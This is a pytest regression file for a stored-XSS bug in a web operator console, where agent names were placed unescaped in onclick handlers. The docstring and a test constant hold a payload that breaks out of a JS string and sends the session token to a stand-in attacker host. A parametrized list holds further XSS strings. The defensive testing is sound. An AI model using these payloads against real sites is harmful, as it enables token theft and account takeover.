"""Regression for a confirmed stored-XSS in the operator console.

Reproduced live in a browser before this fix: creating an agent named
    x'); fetch('https://evil/steal?c='+localStorage.getItem('agentguard_token')); //
(accepted server-side — AgentIn.name has no pattern restriction) and clicking
"Reputation" on that agent's row ran the injected JS and could exfiltrate the
console's session token, which is stored in localStorage.

The cause: `esc()` HTML-escapes `& < > "` for the HTML-attribute context, but
several buttons build `onclick="fn('${esc(name)}')"` — an HTML-escaped value
nested inside a *JS string literal* nested inside that HTML attribute. `esc()`
never escapes `'`, so a name containing one breaks out of the JS string and its
remainder is parsed as code the moment the button is clicked.

These tests execute the ACTUAL `esc`/`escJs` functions from the shipped HTML
via Node (not a Python reimplementation, which could silently drift from the
real code) and assert a hostile name always round-trips as inert string data.
"""

from __future__ import annotations

import json
import re
import shutil
import subprocess
from pathlib import Path

import pytest

_HTML = Path(__file__).parent.parent / "agentguard" / "static" / "index.html"

pytestmark = pytest.mark.skipif(shutil.which("node") is None, reason="node not available")


def _extract_js(name: str) -> str:
    """Pull one `const <name> = ...;` definition verbatim out of index.html."""
    text = _HTML.read_text()
    m = re.search(rf"const {re.escape(name)} = .*?;\n", text, re.DOTALL)
    assert m, f"could not find `const {name} = ...;` in {_HTML}"
    return m.group(0)


def _run_node(js_snippet: str) -> str:
    esc_src = _extract_js("esc")
    esc_js_src = _extract_js("escJs")
    script = f"{esc_src}\n{esc_js_src}\n{js_snippet}"
    result = subprocess.run(["node", "-e", script], capture_output=True, text=True, timeout=10)
    assert result.returncode == 0, f"node script failed: {result.stderr}"
    return result.stdout.strip()


# The exact payload reproduced live: breaks out of the onclick JS string and
# exfiltrates the session token the moment the button is clicked.
PAYLOAD = "x'); fetch('https://evil.example/steal?c='+localStorage.getItem('agentguard_token')); //"


def _simulate_click(name: str) -> dict:
    """Build the real onclick attribute, then behave like a browser: HTML-decode
    the attribute (the only transform a real `<button onclick="...">` gets)
    before the JS engine parses it, and report what actually executes.
    """
    out = _run_node(f"""
      const name = {json.dumps(name)};
      const attr = `onclick="showReputation(42, '${{escJs(name)}}')"`;
      // The only thing a browser does to an attribute value before the JS
      // engine sees it is HTML-entity-decode it. Replicate exactly that.
      const decoded = attr
        .replace(/&quot;/g, '"').replace(/&lt;/g, "<")
        .replace(/&gt;/g, ">").replace(/&amp;/g, "&");
      const body = decoded.match(/onclick="(.*)"$/)[1];
      let calls = 0;
      let capturedArg = null;
      globalThis.showReputation = (id, arg) => {{ calls++; capturedArg = arg; }};
      globalThis.fetch = () => {{ throw new Error("XSS FIRED: fetch() was called"); }};
      globalThis.localStorage = {{ getItem: () => "should-never-be-read" }};
      try {{
        // eslint-disable-next-line no-eval
        eval(body);
      }} catch (e) {{
        console.log(JSON.stringify({{ error: String(e) }}));
        process.exit(0);
      }}
      console.log(JSON.stringify({{ calls, capturedArg, attr }}));
    """)
    return json.loads(out)


def test_malicious_agent_name_does_not_execute_on_click():
    result = _simulate_click(PAYLOAD)
    assert "error" not in result, f"payload executed as code: {result.get('error')}"
    assert result["calls"] == 1, "showReputation should be called exactly once, safely"
    assert result["capturedArg"] == PAYLOAD, "the name must arrive as inert string data"


@pytest.mark.parametrize("payload", [
    "x'); alert(1); //",
    'x"); alert(1); //',
    "x</script><script>alert(1)</script>",
    "line1\nline2'); alert(1); //",
    "back\\slash' attempt",
    "normal agent name",
    "",
])
def test_escjs_round_trips_arbitrary_names_as_inert_data(payload):
    result = _simulate_click(payload)
    assert "error" not in result, f"{payload!r} executed as code: {result.get('error')}"
    assert result["capturedArg"] == payload


def test_esc_alone_is_not_used_for_onclick_js_string_arguments():
    """Guard against the bug being reintroduced at a new call site.

    Every `onclick="...('${...}')"` — a value embedded inside a single-quoted
    JS string inside the attribute — must use escJs, not esc. `esc()` alone is
    correct for other attribute contexts (aria-label, plain attribute values),
    so this only checks the specific vulnerable shape.
    """
    text = _HTML.read_text()
    for m in re.finditer(r"onclick=\"[^\"]*'\$\{([^}]*)\}[^\"]*\"", text):
        expr = m.group(1)
        assert expr.strip().startswith("escJs(") or expr.strip() in ("t",), (
            f"onclick attribute uses {expr!r} inside a single-quoted JS string "
            f"without escJs(): {m.group(0)}"
        )
